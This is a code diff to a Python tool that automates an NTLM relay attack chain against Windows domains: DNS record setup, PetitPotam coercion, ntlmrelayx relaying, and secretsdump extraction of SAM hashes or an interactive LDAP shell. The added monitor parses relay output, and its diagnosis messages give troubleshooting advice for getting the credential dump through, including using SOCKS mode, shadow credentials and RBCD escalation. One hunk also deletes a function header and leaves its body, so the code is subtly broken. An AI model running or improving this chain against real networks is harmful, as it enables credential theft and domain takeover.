@@ -229,9 +229,176 @@ class PacketCapture:
 
 
 # ═══════════════════════════════════════════════
+# Relay output monitor (background thread)
+# ═══════════════════════════════════════════════
+class RelayMonitor(threading.Thread):
+    """Reads ntlmrelayx stdout/stderr in real time, parses key events, tracks relay state."""
+
+    # Relay stages in order
+    STAGE_WAITING       = 0
+    STAGE_LISTENING     = 1
+    STAGE_CALLBACK      = 2
+    STAGE_RELAY_AUTH    = 3
+    STAGE_DUMP_STARTED  = 4
+    STAGE_DUMP_SUCCESS  = 5
+    STAGE_LDAP_SHELL    = 6  # LDAPS mode
+
+    STAGE_NAMES = {
+        0: "Waiting for ntlmrelayx to start",
+        1: "Listener ready, waiting for callback",
+        2: "Callback received (NTLM auth inbound)",
+        3: "Relay authenticated on target",
+        4: "Secretsdump running",
+        5: "SAM/secrets dumped successfully",
+        6: "LDAP interactive shell opened",
+    }
+
+    def __init__(self, proc, is_ldaps_mode=False):
+        super().__init__(daemon=True)
+        self.proc = proc
+        self.is_ldaps_mode = is_ldaps_mode
+        self.stage = self.STAGE_WAITING
+        self.stop_event = threading.Event()
+        self.errors = []
+        self.lines = []
+
+    def _advance(self, new_stage, detail=""):
+        if new_stage > self.stage:
+            self.stage = new_stage
+            log("RELAY", "ok", f"{C.GREEN}{C.BOLD}Stage → {self.STAGE_NAMES[new_stage]}{C.RST}", C.GREEN)
+            if detail:
+                log("RELAY", "..", detail)
+
+    def _parse_line(self, line):
+        low = line.lower()
+        self.lines.append(line)
+
+        # ── Determine color and protocol tag ──
+        color = C.WHITE
+        proto = "RELAY"
+
+        if "error" in low or "denied" in low or "failed" in low or "refused" in low:
+            color = C.RED
+        elif "success" in low or "authenticated" in low or "dumping" in low:
+            color = C.GREEN
+        elif "warning" in low:
+            color = C.YELLOW
+
+        # ── Print the line ──
+        log(proto, "<<", f"{color}{line}{C.RST}")
+
+        # ── Track state transitions ──
+        if "servers started" in low or "setting up smb server" in low:
+            self._advance(self.STAGE_LISTENING)
+
+        elif "smbd-thread" in low or "authenticate_message" in low or "received connection" in low or "connection from" in low:
+            self._advance(self.STAGE_CALLBACK, "NTLM callback arrived from coerced target")
+
+        elif "authenticating against" in low:
+            log("RELAY", ">>", f"Forwarding captured auth to relay target...")
+
+        elif "authenticated successfully" in low or "succeed" in low:
+            self._advance(self.STAGE_RELAY_AUTH, "Relay target accepted the forwarded NTLM auth")
+
+        elif "dumping" in low or "remote operations" in low or "secretsdump" in low:
+            self._advance(self.STAGE_DUMP_STARTED, "secretsdump is running against relay target")
+
+        elif "sam hashes" in low or ":::" in line:
+            self._advance(self.STAGE_DUMP_SUCCESS, "Credentials extracted")
+
+        elif "interactive" in low and ("ldap" in low or "smb" in low or "shell" in low):
+            self._advance(self.STAGE_LDAP_SHELL, "Connect with: nc 127.0.0.1 11000")
+
+        # ── Track errors ──
+        if "access_denied" in low or "access is denied" in low or "status_access_denied" in low:
+            self.errors.append("ACCESS_DENIED")
+            log("RELAY", "!!", f"{C.BG_RED}{C.WHITE} Relay target returned ACCESS DENIED {C.RST}")
+            if self.stage >= self.STAGE_RELAY_AUTH:
+                log("RELAY", "..", "Relay auth worked but secretsdump was blocked (likely AV/EDR or not admin).", C.YELLOW)
+                log("RELAY", "..", "Try --socks mode and connect manually with smbclient.py or nxc.", C.YELLOW)
+
+        elif "signature" in low and ("required" in low or "signing" in low):
+            self.errors.append("SIGNING_REQUIRED")
+            log("RELAY", "!!", f"{C.BG_RED}{C.WHITE} Relay rejected: SMB signing required {C.RST}")
+
+        elif "ldap server returned error" in low or "ldap error" in low:
+            self.errors.append("LDAP_REJECTED")
+            log("RELAY", "!!", f"{C.BG_RED}{C.WHITE} LDAP relay rejected (signing or channel binding enforced) {C.RST}")
+
+        elif "connection refused" in low or "connection reset" in low:
+            self.errors.append("CONNECTION_REFUSED")
+
+    def run(self):
+        try:
+            for line in iter(self.proc.stdout.readline, b''):
+                if self.stop_event.is_set():
+                    break
+                decoded = line.decode(errors="replace").rstrip()
+                if decoded:
+                    self._parse_line(decoded)
+        except Exception:
+            pass
+
+        # Also drain stderr
+        try:
+            for line in iter(self.proc.stderr.readline, b''):
+                if self.stop_event.is_set():
+                    break
+                decoded = line.decode(errors="replace").rstrip()
+                if decoded:
+                    self._parse_line(decoded)
+        except Exception:
+            pass
+
+    def stop(self):
+        self.stop_event.set()
+
+    def get_diagnosis(self):
+        """Return a human-readable diagnosis of what happened."""
+        diag = []
+
+        if self.stage == self.STAGE_WAITING:
+            diag.append(("ntlmrelayx never started", C.RED))
+        elif self.stage == self.STAGE_LISTENING:
+            diag.append(("No NTLM callback ever arrived on port 445", C.RED))
+            diag.append(("The coercion failed silently, or the DNS record is pointing to the wrong IP.", C.YELLOW))
+            diag.append(("Verify with: dig +short <record>.domain @DC_IP", C.DIM))
+        elif self.stage == self.STAGE_CALLBACK:
+            diag.append(("Callback arrived but relay auth failed", C.RED))
+            if "SIGNING_REQUIRED" in self.errors:
+                diag.append(("Relay target requires SMB signing. Use --smb-signing-is-on or pick a different target.", C.YELLOW))
+            elif "LDAP_REJECTED" in self.errors:
+                diag.append(("DC rejected LDAP relay. LDAP signing or channel binding is enforced.", C.YELLOW))
+            else:
+                diag.append(("The relay target may have rejected the auth for unknown reasons. Check output above.", C.YELLOW))
+        elif self.stage == self.STAGE_RELAY_AUTH:
+            diag.append(("Relay auth SUCCEEDED but no dump/shell appeared", C.YELLOW))
+            if "ACCESS_DENIED" in self.errors:
+                diag.append(("secretsdump got ACCESS DENIED. Relay worked but the machine account is not admin,", C.YELLOW))
+                diag.append(("or AV/EDR blocked the SAM dump. The relay itself is still a valid finding.", C.YELLOW))
+                diag.append(("Try: re-run with --socks, then use proxychains smbclient.py to confirm admin access.", C.CYAN))
+            else:
+                diag.append(("The session may have timed out before secretsdump could run.", C.YELLOW))
+        elif self.stage == self.STAGE_DUMP_STARTED:
+            diag.append(("secretsdump started but did not complete", C.YELLOW))
+            if "ACCESS_DENIED" in self.errors:
+                diag.append(("Partial access: dump was blocked mid-way, likely by EDR.", C.YELLOW))
+                diag.append(("The relay and admin access are confirmed. Use --socks for manual PoC.", C.CYAN))
+            else:
+                diag.append(("Connection may have dropped. Try again or use --socks.", C.YELLOW))
+        elif self.stage == self.STAGE_DUMP_SUCCESS:
+            diag.append(("Full success: credentials were dumped.", C.GREEN))
+        elif self.stage == self.STAGE_LDAP_SHELL:
+            diag.append(("LDAPS relay worked. Interactive LDAP shell is open.", C.GREEN))
+            diag.append(("Connect with: nc 127.0.0.1 11000", C.CYAN))
+            diag.append(("From there you can set up RBCD or shadow credentials.", C.CYAN))
+
+        return diag
+
+
+# ═══════════════════════════════════════════════
 # Venv / dependency logic
 # ═══════════════════════════════════════════════
-def ensure_venv():
     script_dir = Path(__file__).parent.absolute()
     venv_dir = script_dir / "venv"
     venv_python = venv_dir / "bin" / "python3"
@@ -518,11 +685,16 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
         sys.exit(1)
 
     log("SMB", ">>", f"Launch: {C.DIM}{' '.join(cmd)}{C.RST}")
-    proc = subprocess.Popen(cmd)
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     log("SMB", "ok", f"ntlmrelayx started (PID {proc.pid})")
     log("SMB", "..", f"Listening on :445 for inbound NTLM auth...")
     log_result("ntlmrelayx started", True, f"PID {proc.pid}")
-    return proc
+
+    # Start output monitor
+    monitor = RelayMonitor(proc, is_ldaps_mode=smb_signing)
+    monitor.start()
+
+    return proc, monitor
 
 
 # ═══════════════════════════════════════════════
@@ -641,7 +813,7 @@ def run_coercion(target_ip, domain, user, password, method="PetitPotam"):
 # ═══════════════════════════════════════════════
 # Final summary
 # ═══════════════════════════════════════════════
-def print_summary():
+def print_summary(relay_monitor=None):
     print(f"\n{C.BOLD}{C.WHITE}{'═'*60}{C.RST}")
     print(f"  {C.BOLD}{C.WHITE}CHAIN SUMMARY{C.RST}")
     print(f"{C.BOLD}{C.WHITE}{'═'*60}{C.RST}")
@@ -657,13 +829,22 @@ def print_summary():
         if not passed:
             all_pass = False
 
-    print()
-    if all_pass:
-        print(f"  {C.GREEN}{C.BOLD}All checks passed.{C.RST} If SAM dump still doesn't appear:")
-        print(f"  {C.DIM}  1. The relayed machine account may not be admin on the relay target.{C.RST}")
-        print(f"  {C.DIM}  2. The coercion callback may have gone to the wrong IP (check pcap).{C.RST}")
-        print(f"  {C.DIM}  3. Try relaying to a different host where the machine account has admin.{C.RST}")
-    else:
+    # ── Relay-level diagnosis ──
+    if relay_monitor:
+        print()
+        print(f"  {C.BOLD}{C.WHITE}RELAY DIAGNOSIS{C.RST}")
+        stage_name = relay_monitor.STAGE_NAMES.get(relay_monitor.stage, "Unknown")
+        stage_color = C.GREEN if relay_monitor.stage >= RelayMonitor.STAGE_RELAY_AUTH else C.YELLOW if relay_monitor.stage >= RelayMonitor.STAGE_CALLBACK else C.RED
+        print(f"  Relay reached: {stage_color}{C.BOLD}{stage_name}{C.RST}")
+        print()
+        for msg, color in relay_monitor.get_diagnosis():
+            print(f"  {color}  {msg}{C.RST}")
+    elif all_pass:
+        print()
+        print(f"  {C.DIM}  (Relay output was not monitored){C.RST}")
+
+    if not all_pass:
+        print()
         first_fail = next((s for s, p, d in CHAIN_LOG if not p), None)
         print(f"  {C.RED}{C.BOLD}Chain broke at: {first_fail}{C.RST}")
         print(f"  {C.DIM}  Fix the first failure above and re-run.{C.RST}")
@@ -793,10 +974,10 @@ def main():
     log("DNS", "..", f"Full record to verify: {C.YELLOW}{full_record}{C.RST}")
 
     if not wait_for_dns_record(full_record, args.dns_ip, timeout=60):
-        print_summary()
+        print_summary(None)
         sys.exit(1)
 
-    ntlmrelay_proc = start_ntlmrelayx(
+    ntlmrelay_proc, relay_monitor = start_ntlmrelayx(
         args.relay_target, args.custom_command, args.socks, args.smb_signing_is_on,
         args.dc_ip, args.dc_fqdn, args.dns_ip
     )
@@ -807,14 +988,16 @@ def main():
         log("SMB", "!!", f"{C.BG_RED}{C.WHITE} ntlmrelayx DIED (exit code {ntlmrelay_proc.returncode}) {C.RST}", C.RED)
         log("SMB", "..", "Usually means port 445 conflict or bad arguments.", C.RED)
         log_result("ntlmrelayx running", False, f"exited {ntlmrelay_proc.returncode}")
-        print_summary()
+        print_summary(relay_monitor)
         sys.exit(1)
 
     domain, user = args.username.split("\\", 1)
     run_coercion(args.coerce_target, domain, user, args.password, args.method)
 
-    # ── Print summary ──
-    print_summary()
+    # ── Wait for relay activity then print summary ──
+    log("RELAY", "..", "Waiting 15s for relay output to settle...")
+    time.sleep(15)
+    print_summary(relay_monitor)
 
     print(f"{C.BOLD}[*] Exploit chain triggered. Watching for relay activity...{C.RST}")
     print(f"{C.DIM}    Press Ctrl+C to stop.{C.RST}")
@@ -826,9 +1009,12 @@ def main():
     except KeyboardInterrupt:
         print(f"\n{C.YELLOW}[*] Stopping...{C.RST}")
         ntlmrelay_proc.terminate()
+        relay_monitor.stop()
         conn_monitor.stop()
         if pcap:
             pcap.stop()
+        # Print final diagnosis on exit
+        print_summary(relay_monitor)
 
 
 if __name__ == "__main__":
